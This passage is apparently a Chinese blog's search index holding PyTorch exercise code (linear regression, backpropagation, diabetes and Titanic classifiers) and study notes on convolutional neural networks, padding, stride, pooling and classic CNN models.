y_pred = model(x_data) # 1.前向传播，计算y heat loss = criterion(y_pred, y_data) # 2.计算损失 print(epoch, loss) # 打印 optimizer.zero_grad() # 梯度会自动计算，务必梯度清零！ loss.backward() # 3.反向传播 optimizer.step() # 4.更新 update # 打印权重和偏置 print(\"w=\", model.linear.weight.item()) # model下面的linear，下面的weight print(\"b=\", model.linear.bias.item()) # 测试模型 x_test = torch.Tensor([[4.0]]) y_test = model(x_test) print(\"y_pred=\", y_test.data) ","date":"2022-08-15","objectID":"/pytorch%E5%AE%9E%E7%8E%B0%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92-b%E7%AB%99%E5%88%98%E4%BA%8C%E5%A4%A7%E5%A4%A7%E7%BB%83%E4%B9%A0%E9%A2%98/:0:0","tags":["PyTorch"],"title":"PyTorch实现线性回归(B站刘二大大练习题)","uri":"/pytorch%E5%AE%9E%E7%8E%B0%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92-b%E7%AB%99%E5%88%98%E4%BA%8C%E5%A4%A7%E5%A4%A7%E7%BB%83%E4%B9%A0%E9%A2%98/"},{"categories":["AI"],"content":" \"\"\" 刘二练习题，仿照demo简单实现反向传播 \"\"\" import torch x_data = [1.0, 2.0, 3.0] # 输入 y_data = [2.0, 4.0, 6.0] # 输出 w = torch.Tensor([1.0]) # 权重w w.requires_grad = True # 设置True，表示需要计算梯度 # 前馈 def forward(x): return x * w # 单个样本的损失 def loss(x, y): y_pred = forward(x) return (y_pred - y) ** 2 print(\"预测值(训练之前)：\", 4, forward(4).item()) # 训练 for epoch in range(100): for x, y in zip(x_data, y_data): l = loss(x, y) # 前向传播，计算loss l.backward() # 反向传播 print(\"\\t 梯度：\", x, y, w.grad.item()) # .item()是直接把值拿出来产生标量 # 只要一做backward的时候，计算图就会被释放了 w.data = w.data - 0.01 * w.grad.data # 梯度下降，更新权重。 w.grad也是一个tensor，所以要取他的data（这里只是修改数值，用.data的时候不会生成计算图）。这里的0.01 是学习率 w.grad.data.zero_() # 更新完之后，对梯度清零 print(\"进度：\", epoch, l.item()) print(\"预测值(训练之后)：\", 4, forward(4).item()) ","date":"2022-08-15","objectID":"/pytorch%E5%8F%8D%E5%90%91%E4%BC%A0%E6%92%AD-b%E7%AB%99%E5%88%98%E4%BA%8C%E5%A4%A7%E5%A4%A7%E7%BB%83%E4%B9%A0%E9%A2%98/:0:0","tags":["深度学习","PyTorch"],"title":"PyTorch反向传播(B站刘二大大练习题)","uri":"/pytorch%E5%8F%8D%E5%90%91%E4%BC%A0%E6%92%AD-b%E7%AB%99%E5%88%98%E4%BA%8C%E5%A4%A7%E5%A4%A7%E7%BB%83%E4%B9%A0%E9%A2%98/"},{"categories":["AI"],"content":" 数据集： \"\"\" 解决糖尿病预测的问题 \"\"\" import torch import numpy as np # 1.读取数据 data = np.loadtxt(\"./data/diabetes.csv.gz\", delimiter=\",\", dtype=np.float32) x_data = torch.from_numpy(data[:-1, :-1]) # x不取最后一列 y_data = torch.from_numpy(data[:-1, [-1]]) # y取所有行和最后一列， [-1]代表是矩阵 # 2.设计模型 class Model(torch.nn.Module): def __init__(self): super(Model, self).__init__() self.linear1 = torch.nn.Linear(8, 6) # 不断降维 self.linear2 = torch.nn.Linear(6, 4) self.linear3 = torch.nn.Linear(4, 1) self.sigmoid = torch.nn.Sigmoid() self.active = torch.nn.ReLU() def forward(self, x): x = self.active(self.linear1(x)) # o1 x = self.active(self.linear2(x)) # o2 x = self.sigmoid(self.linear3(x)) # y heat return x model = Model() # 3.构造损失和优化器 criterion = torch.nn.BCELoss(size_average=True) optimizer = torch.optim.SGD(model.parameters(), lr=0.1) # 4.训练 for epoch in range(1000): # 这里forward 并非mini-batch的设计，只是mini-batch的风格 y_pred = model(x_data) loss = criterion(y_pred, y_data) print(epoch, loss.item()) # backward optimizer.zero_grad() loss.backward() # update optimizer.step() # 测试集 test_data = torch.from_numpy(data[[-1], :-1]) pred_test = torch.from_numpy(data[[-1], [-1]]) print(\"test_pred = \", model(test_data).item()) print(\"infact_pred = \", pred_test.item()) ","date":"2022-08-14","objectID":"/%E4%BD%BF%E7%94%A8pytorch%E9%A2%84%E6%B5%8B%E7%B3%96%E5%B0%BF%E7%97%85-b%E7%AB%99%E5%88%98%E4%BA%8C%E5%A4%A7%E5%A4%A7%E7%BB%83%E4%B9%A0%E9%A2%98/:0:0","tags":["深度学习","PyTorch"],"title":"使用PyTorch预测糖尿病(B站刘二大大练习题)","uri":"/%E4%BD%BF%E7%94%A8pytorch%E9%A2%84%E6%B5%8B%E7%B3%96%E5%B0%BF%E7%97%85-b%E7%AB%99%E5%88%98%E4%BA%8C%E5%A4%A7%E5%A4%A7%E7%BB%83%E4%B9%A0%E9%A2%98/"},{"categories":["AI"],"content":" B站河北工业大学老师刘二课后作业 数据地址：https://www.kaggle.com/c/titanic/data?select=test.csv \"\"\" 课后作业： 建立DataLoader: https://www.kaggle.com/c/titanic/data 使用DataLoader建立分类器 \"\"\" import numpy as np import torch from torch.utils.data import Dataset import pandas as pd from torch.utils.data import DataLoader # 数据准备 # 1、定义自己的数据集类 class My_dataset(Dataset): # 定义自己的数据集类，其继承于Dataset def __init__(self, filepath): # 初始化自己的文件读取路径 # 从原始数据集中提取5个特征 features = [\"Pclass\", \"Sex\", \"SibSp\", \"Parch\", \"Fare\"] # 读取数据 data = pd.read_csv(filepath) self.len = data.shape[0] # [0]代表行数，[1]代表列数 self.x_data = torch.from_numpy(np.array(pd.get_dummies(data[features]))) # dummies相当于one-hot编码 # np.array(data['survived'])是对data['survived']创建一个矩阵 # torch.from_numpy()是将括号内的矩阵形式转换为张量形式，方便torch处理 self.y_data = torch.from_numpy(np.array(data['Survived'])) def __getitem__(self, index): # 输入index就返回X-data中index对应的值 return self.x_data[index], self.y_data[index] def __len__(self): # 返回容器内元素个数，为后面的len()函数进行准备 return self.len # 2、准备自己的数据，实例化数据 dataset = My_dataset(r\"./data/train.csv\") # 3、建立自己的数据集加载器 train_loader = DataLoader(dataset=dataset, batch_size=1, shuffle=True, num_workers=0) # 定义模型 class Model(torch.nn.Module): # 设置要从torch神经网络模块中要继承的模型函数 def __init__(self): super(Model, self).__init__() # 对继承于torch.nn的父模块类进行初始化 # 这里包括2个线性层，每一个线性层输出都用激活函数激活 self.linear1 = torch.nn.Linear(6, 3) # 五个特征转化为了6维，因为get_dummies将性别这一个特征用两个维度来表示，即男性[1,0],女性[0，1] self.linear2 = torch.nn.Linear(3, 1) self.sigmoid = torch.nn.Sigmoid() # 激活函数从Sigmoid这一大类激活函数中选取sigmoid这一种激活函数 # 前向传播 def forward(self, x): x = self.sigmoid(self.linear1(x)) x = self.sigmoid(self.linear2(x)) return x # 定义的预测函数 def predict(self, x): # 该函数用在测试集过程，因此只有前向传播，没有什么 with torch.no_grad(): x = self.sigmoid(self.linear1(x)) x = self.sigmoid(self.linear2(x)) y = [] # 将测试的结果都汇集到这个列表中 for i in x: if i \u003e 0.5: y.append(1) else: y.append(0) return y model = Model() # 构建实例化类 # 构建损失函数和优化器 criterion = torch.nn.BCELoss(reduction='mean') # reduction=‘mean’代表返回损失的平均值，‘sum’代表返回损失和 optimizer = torch.optim.SGD(model.parameters(), lr=0.005) # 优化器选择sgd方法，其中优化对象为创建的实例，优化元素为其权重偏置等网络参数 # 进行训练（前向，反向，迭代更新） if __name__ == '__main__': for epoch in range(100): for i, data in enumerate(train_loader, 0): # 按照索引的方式提取相关数据 inputs, label = data # 转换一次数据类型 inputs = inputs.float() label = label.float() y_pred = model(inputs) # 将维度降至1维并输出出来 y_pred = y_pred.squeeze(-1) # 前向输出结果是[[12],[34],[35],[23],[11]]这种，需要将这个二维矩阵转换成一行[12,34,35,23,11] loss = criterion(y_pred, label) # 将预测的值与标签进行比较，并求解出误差值 print(epoch, i, loss.item()) # 输出迭代次数，每次迭代的顺序以及损失 optimizer.zero_grad() # 之前的梯度进行清零，否则梯度会累加起来 loss.backward() optimizer.step() test_data = pd.read_csv(r\"./data/test.csv\") # 读取测试集文件，并进行测试 features = [\"Pclass\", \"Sex\", \"SibSp\", \"Parch\", \"Fare\"] # 测试集数据的特征应和训练集的保持一致 test = torch.from_numpy(np.array(pd.get_dummies(test_data[features]))) # 将测试集数据进行独热化处理，并输出0,1结果 # 进行预测 y = model.predict(test.float()) outputs = pd.DataFrame({'PassengerId': test_data.PassengerId, 'Survived': y}) print(outputs) ","date":"2022-08-14","objectID":"/%E4%BD%BF%E7%94%A8pytorch%E9%A2%84%E6%B5%8B%E6%B3%B0%E5%9D%A6%E5%B0%BC%E5%85%8B%E7%94%9F%E8%BF%98%E4%BD%9C%E4%B8%9A/:0:0","tags":["深度学习","PyTorch"],"title":"使用PyTorch预测泰坦尼克生还作业","uri":"/%E4%BD%BF%E7%94%A8pytorch%E9%A2%84%E6%B5%8B%E6%B3%B0%E5%9D%A6%E5%B0%BC%E5%85%8B%E7%94%9F%E8%BF%98%E4%BD%9C%E4%B8%9A/"},{"categories":["AI"],"content":"前言 卷积神经网络（Convolutional Neural Network，CNN) 是多层感知机(MLP)的变种，是一类包含卷积计算且具有深度结构的前馈神经网络(FNN)，是深度学习的代表算法之一。常被用于图像识别、语音识别等各种场合，在图像识别的比赛中，基于深度学习的方法几乎都以CNN为基础。 CNN本质上是一个多层感知机，xx其成功的原因关键在于它所采用的局部连接和共享权值的方式xx，一方面减少了的权值的数量使得网络易于优化，另一方面降低了过拟合的风险。 ","date":"2022-07-30","objectID":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/:1:0","tags":["卷积神经网络","CNN","深度学习"],"title":"卷积神经网络(CNN)学习","uri":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"整体结构 一般情况下，CNN的结构形式是：输入层–\u003e Conv层 –\u003e Pooling层 –\u003e (重复Conv、Pooling层) … –\u003e FC(Full-connected)层 –\u003e 输出结果 通常输入层大小一般为2的整数倍，通常卷积层使用较小的filter，如3x3，最大也就5x5。Pooling层用于对卷积结果进行降低维度，例如选择2x2的区域对卷积层进行降低维度，则选择2x2区域的最大值作为输出，这样卷积层的维度就降为之前一半。 卷积神经网络整体架构： 卷积神经网络是一种多层的监督学习神经网络，隐含层的xx卷积层xx和xx池化层xx是实现卷积神经网络特征提取功能的核心模块。 该网络模型通过采用梯度下降法最小化损失函数对网络中的权重参数逐层反向调节，通过频繁的迭代训练提高网络的精度。 卷积神经网络的低隐层是由卷积层和最大池采样层交替组成，高层是全连接层对应传统多层感知器的隐含层和逻辑回归分类器。第一个全连接层的输入是由卷积层和子采样层进行特征提取得到的特征图像。最后一层输出层是一个分类器，可以采用逻辑回归，Softmax回归甚至是支持向量机对输入图像进行分类。 xx卷积神经网络结构包括：xx卷积层，降采样层，全链接层。每一层有多个特征图(feature map)，每个特征图通过一种卷积滤波器(filter)提取输入的一种特征，每个特征图有多个神经元。 输入图像统计和滤波器进行卷积之后，提取该局部特征，一旦该局部特征被提取出来之后，它与其他特征的位置关系也随之确定下来了，每个神经元的输入和前一层的局部感受野相连，每个特征提取层都紧跟一个用来求局部平均与二次提取的计算层，也叫特征映射层，网络的每个计算层由多个特征映射平面组成，平面上所有的神经元的权重相等。 通常将输入层到隐藏层的映射称为一个特征映射，也就是通过卷积层得到特征提取层，经过pooling之后得到特征映射层。 比如之前用Affine层实现了全连接层，一个5层的全连接的神经网络如下图的网络结构来实现： 而CNN 中新增了Convolution层和Pooling层。CNN的层的连接顺序是Convolution - ReLU -(Pooling)（Pooling层有时会被省 略）。这可以理解为之前的Affine - ReLU连接被替换成了Convolution - ReLU -（Pooling）连接。 xx卷积神经网络相比一般神经网络在图像中的优点：xx 网络结构能够较好的适应图像的结构 同时进行特征提取和分类，使得特征提取有助于特征分类 权值共享可以减少网络的训练参数，使得神经网络结构变得简单，适应性更强 xx在CNN中，权值更新是基于反向传播算法。xx xx训练算法主要包括四步，这四步被分为两个阶段：xx 第一阶段，向前传播阶段： (1). 从样本集中取一个样本，输入网络； (2). 计算相应的实际输出；在此阶段，信息从输入层经过逐级的变换，传送到输出层。这个过程也是网络在完成训练后正常执行时执行的过程。 第二阶段，向后传播阶段： (1). 计算实际输出与相应的理想输出的差； (2). 按极小化误差的方法调整权矩阵。 这两个阶段的工作一般应受到精度要求的控制。 ","date":"2022-07-30","objectID":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/:2:0","tags":["卷积神经网络","CNN","深度学习"],"title":"卷积神经网络(CNN)学习","uri":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"局部感受（稀疏连接） \u0026 权值共享 卷积神经网络的核心思想就是局部感受野、是权值共享和pooling层，以此来达到简化网络参数并使得网络具有一定程度的位移、尺度、缩放、非线性形变稳定性。 局部感受野：由于图像的空间联系是局部的，每个神经元不需要对全部的图像做感受，只需要感受局部特征即可，然后在更高层将这些感受得到的不同的局部神经元综合起来就可以得到全局的信息了，这样可以减少连接的数目 权值共享：不同神经元之间的参数共享可以减少需要求解的参数，使用多种滤波器去卷积图像就会得到多种特征映射。权值共享其实就是对图像用同样的卷积核进行卷积操作，也就意味着第一个隐藏层的所有神经元所能检测到处于图像不同位置的完全相同的特征。其主要的能力就能检测到不同位置的同一类型特征，也就是卷积网络能很好的适应图像的小范围的平移性，即有较好的平移不变性（比如将输入图像的猫的位置移动之后，同样能够检测到猫的图像 ","date":"2022-07-30","objectID":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/:3:0","tags":["卷积神经网络","CNN","深度学习"],"title":"卷积神经网络(CNN)学习","uri":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"卷积层、下采样层(池化层)、全连接层概览 xx卷积层：xx通过卷积运算我们可以提取出图像的特征，通过卷积运算可以使得原始信号的某些特征增强，并且降低噪声。 xx下采样层(池化层)：xx因为对图像进行下采样，可以减少数据处理量同时保留有用信息，采样可以混淆特征的具体位置，因为某个特征找出来之后，它的位置已经不重要了，我们只需要这个特征和其他特征的相对位置，可以应对形变和扭曲带来的同类物体的变化。 全连接层：采用softmax全连接，得到的激活值即卷积神经网络提取到的图片特征。 xx全连接层xx：采用softmax全连接，得到的激活值即卷积神经网络提取到的图片特征。 ","date":"2022-07-30","objectID":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/:4:0","tags":["卷积神经网络","CNN","深度学习"],"title":"卷积神经网络(CNN)学习","uri":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"卷积层 相当于特征提取 卷积神经网路中每层卷积层由若干卷积单元组成，每个卷积单元的参数都是通过反向传播算法优化得到的。卷积运算的目的是提取输入的不同特征，第一层卷积层可能只能提取一些低级的特征如边缘、线条和角等层级，更多层的网络能从低级特征中迭代提取更复杂的特征。 CNN中每一层的由多个map组成，每个map由多个神经单元组成，同一个map的所有神经单元共用一个卷积核（即权重），卷积核往往代表一个特征 ","date":"2022-07-30","objectID":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/:5:0","tags":["卷积神经网络","CNN","深度学习"],"title":"卷积神经网络(CNN)学习","uri":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"全连接层存在的问题 在全连接层中，相邻层的神经元全部连接在一起，输出的数量可以任意决定。 xx全连接层存在什么问题呢？xx那就是数据的形状被“忽视”了。 比如，输入数据是图像时，图像通常是高、长、通道方向上的3维形状。但是，向全连接层输入时，需要将3维数据拉平为1维数据。 图像是3维形状，这个形状中应该含有重要的空间信息。比如，空间上邻近的像素为相似的值、RBG的各个通道之间分别有密切的关联性、相距较远的像素之间没有什么关联等，3维形状中可能隐藏有值得提取的本质模式。但是，因为全连接层会忽视形状，将全部的输入数据作为相同的神经元（同一维度的神经元）处理，所以无法利用与形状相关的信息。 xx而卷积层可以保持形状不变。xx当输入数据是图像时，卷积层会以3维数据的形式接收输入数据，并同样以3维数据的形式输出至下一层。因此，在CNN中，可以（有可能）正确理解图像等具有形状的数据。 CNN中，有时将卷积层的输入输出数据称为特征图（feature map） ","date":"2022-07-30","objectID":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/:5:1","tags":["卷积神经网络","CNN","深度学习"],"title":"卷积神经网络(CNN)学习","uri":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"卷积运算 卷积层进行的处理就是卷积运算。卷积运算相当于图像处理中的“滤波器运算” 边缘检测包括垂直检测和水平检测： 以垂直边缘检测为例： 对一个6x6的灰度图像做卷积运算(卷积符号是x),即6x6x1 在神经网络卷积过程中，可以建立一个3x3的矩阵(即filter或者kernel)，如下图，那么就可以用这个filter去求它的卷积，最终输出会是一个右边4x4的图像。 把3x3的filter贴到第一张图像矩阵上，对应位置数字相乘，最后求和(xx乘积累加运算xx，如在第一位置上的值为-5),把求和值写到输出图像对应第一个位置上 然后依次移动计算第二个元素，进行相同的运算，求出对应第2个第三个位置的值： 继续移动到下一行进行计算： 直到计算出所有结果： 上述垂直检测的步骤在课后习题中，使用的是conv_forward函数来实现，在tensflow使用的是tf.conv2d,…… 当然检测水平边缘也是类似的： xx3x3的filter中填充的数字的值到底为多少仍有争议xx： 有不同的filter 用fxf的filter来卷积nxn的的图像，得到的新图像的维度是(n-f+1)x(n-f+1) 维度公式： xx偏置：xx 不仅在FCN中，在CNN中除了权重参数(filter中的参数就对应之前的权重)，也存在偏置项 如下图，向应用了滤波器的数据加上了偏置。偏置通常只有1个(1x1)，这个值 会被加到应用了滤波器的所有元素上(广播机制)。 ","date":"2022-07-30","objectID":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/:5:2","tags":["卷积神经网络","CNN","深度学习"],"title":"卷积神经网络(CNN)学习","uri":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"Padding(填充) 使用填充主要是为了调整输出的大小 xx前面卷积操作的缺点：xx ● 每次卷积操作，图像都会变小 ● 图片边缘的像素只会在输出时使用一次，丢失许多图片边界上的信息 xx解决办法：xx 卷积操作前，填充(pad)图片，比如用1个像素添加额外边缘，这样图片就变成了8x8，这样output的图片就是6x6(保持了原始尺寸)，同时也减轻图片边缘被忽略的程度 添加pandding后，尺寸 用fxf的filter来卷积nxn的的图像，填充宽度为p，得到的新图像的维度是(n+2p-f+1)x(n+2p-f+1) xx到底需要填充多少宽度呢？xx 有两种卷积： valid卷积–\u003e填充p宽度为0(即不填充，输出尺寸同前面) same卷积–\u003e有足够的填充 filter的尺寸f取值通常是奇数（如果是偶数可能会不对称） ","date":"2022-07-30","objectID":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/:5:3","tags":["卷积神经网络","CNN","深度学习"],"title":"卷积神经网络(CNN)学习","uri":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"Stride(卷积步长) 综上，增大步幅后，输出大小会变小。而增大填充后，输出大小会变大。 xx最终维度总结：xx 用fxf的filter对nxn图像进行卷积，步长设为s，padding值设置为p，最终得到的维度为：$\\frac{n+2p-f}{s}+1$ x $\\frac{n+2p-f}{s}+1$ 我们尝试用上述维度公式做几个计算： 1.输入大小：(28, 31)；填充：2；步幅：3；滤波器大小：(5, 5) 当除不尽的时候，一般使用floor向下取整 补充：交叉相关(cross correlation) 我们前面的操作没有对filter进行翻转，实际上只能称为交叉相关，并不能称为数学意义上卷积(进行翻转的才叫卷积)，但由于深度学习的约定，所以我们都称之为卷积。 ","date":"2022-07-30","objectID":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/:5:4","tags":["卷积神经网络","CNN","深度学习"],"title":"卷积神经网络(CNN)学习","uri":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"三维卷积 和二维的卷积是类似的，通道方向上有多个特征图时，会按通道 进行输入数据和滤波器的卷积运算，并将结果相加，从而得到输出。 对于多通道的RGB图像如图(6x6x3),使用3x3的filter(3x3x3)，注意filter的通道数量必须和前面图片中的通道数相匹配。 设置为filter为3维是为了简化3x3x3的filter的运算，而不能理解为矩阵的叠加。 filter分别与图像的RGB通道对应的数字相乘,最后得到的也是二维的输出，如下图： 然后移动到下一个位置，继续做27个(3x3x3)次相乘并求和 Note：根据想在哪个颜色上检测边缘，来决定在第几层通道设置上值，而另外的通道设置为0 xx维度公式总结：xx $n \\times n \\times c_n$的图片 $f \\times f \\times c_f$的过滤器 会得到一个(n-f+1, n-f+1, filter_num)的输出 ","date":"2022-07-30","objectID":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/:5:5","tags":["卷积神经网络","CNN","深度学习"],"title":"卷积神经网络(CNN)学习","uri":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"一个\u0026多个卷积核 一个卷积核 两个(多个)卷积核 ","date":"2022-07-30","objectID":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/:5:6","tags":["卷积神经网络","CNN","深度学习"],"title":"卷积神经网络(CNN)学习","uri":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"构建卷积网络的一层 课后习题用到的符号的总结： 层的类型： ● 卷积层(CONN) ● 池化层(POOL) ● 全连接(FC) ","date":"2022-07-30","objectID":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/:5:7","tags":["卷积神经网络","CNN","深度学习"],"title":"卷积神经网络(CNN)学习","uri":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"结合方块思考 来自鱼书，可能和文中其他地方维度书写顺序不一致 ","date":"2022-07-30","objectID":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/:5:8","tags":["卷积神经网络","CNN","深度学习"],"title":"卷积神经网络(CNN)学习","uri":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"池化层(Plloing Layer) 相当于降维压缩数据(缩小高、常方向上的空间的运算) 池化层通常接在卷积层后面，引入它的目的就是为了简化卷积层的输出。 通俗地理解，池化层也在卷积层上架了一个窗口，但这个窗口比卷积层的窗口简单许多，不需要w，b这些参数，它只是对窗口范围内的神经元做简单的操作，如求和，求最大值，把求得的值作为池化层神经元的输入值 ","date":"2022-07-30","objectID":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/:6:0","tags":["卷积神经网络","CNN","深度学习"],"title":"卷积神经网络(CNN)学习","uri":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"Max Pooling(最大池化) 常用，效果也比较好 机制： max pooling做的是，如果在滤波器中任何地方检测到了这些特征，就保留最大的数值，如果没有检测到，可能左侧上方四分之一区域就没有这个特征，于是那些数值的最大值仍然相当小 特性： 有超参数，但是没有需要学习的参数 通道数不发生变化 对微小的位置变化具有鲁棒性 ","date":"2022-07-30","objectID":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/:6:1","tags":["卷积神经网络","CNN","深度学习"],"title":"卷积神经网络(CNN)学习","uri":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"Average Pooling(平均池化) Pooling的总结： ","date":"2022-07-30","objectID":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/:6:2","tags":["卷积神经网络","CNN","深度学习"],"title":"卷积神经网络(CNN)学习","uri":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"为什么使用卷积？ 使用卷积网络的两个原因： ","date":"2022-07-30","objectID":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/:7:0","tags":["卷积神经网络","CNN","深度学习"],"title":"卷积神经网络(CNN)学习","uri":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"经典CNN模型 LeNet-5 AlexNet VGG ","date":"2022-07-30","objectID":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/:8:0","tags":["卷积神经网络","CNN","深度学习"],"title":"卷积神经网络(CNN)学习","uri":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"LeNet-5 这篇paper比较难，可以先不读 卷积网络的“鼻祖” —— LeNet 从一个32x32x1的灰度图像中识别手写数字为例子， 当时还不用填充，所以卷积之后尺寸都会减小 见另一文章： ","date":"2022-07-30","objectID":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/:8:1","tags":["卷积神经网络","CNN","深度学习"],"title":"卷积神经网络(CNN)学习","uri":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"AlexNet 这篇paper容易看懂，建议读一读 从227x227x3的图像开始，第一层用一组96个11x11的步长为4的filter，然后图像缩小到55x55，随后的最大池化层用了3x3的filter，步长为2，降到27x27x96，然后用5x5的same卷积填充，得到27x27x256，再次做最大池化得到13x13x256，然后用3x3的same卷积填充，得到13x13x384，再次用3x3的same卷积填充，再次用3x3的same卷积填充，然后用最大池化，结果降到6x6x256=9216，所以展开为9216分结点，然后有基层全连接层，最后用sofamax输出结果。 AlexNet采用了ReLU激活函数，data augmentation和dropout等训练技巧，为后续深度神经网络的构建提供了范本，之后的卷积神经网络都是遵循AlexNet的构建思路 https://www.cnblogs.com/wangguchangqing/p/10333370.html ","date":"2022-07-30","objectID":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/:8:2","tags":["卷积神经网络","CNN","深度学习"],"title":"卷积神经网络(CNN)学习","uri":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"VGG-16 这篇paper容易看懂，建议读一读 与大量超参数不同，结构更简单，更关注卷积层 优点：真正简化了神经网络结构 vgg16中的16指的是有16个带权重的层 高和宽尺寸每次(因为池化层)会按因子1减少，每次用一组卷积层时通道数会按因子2增加 VGG-19 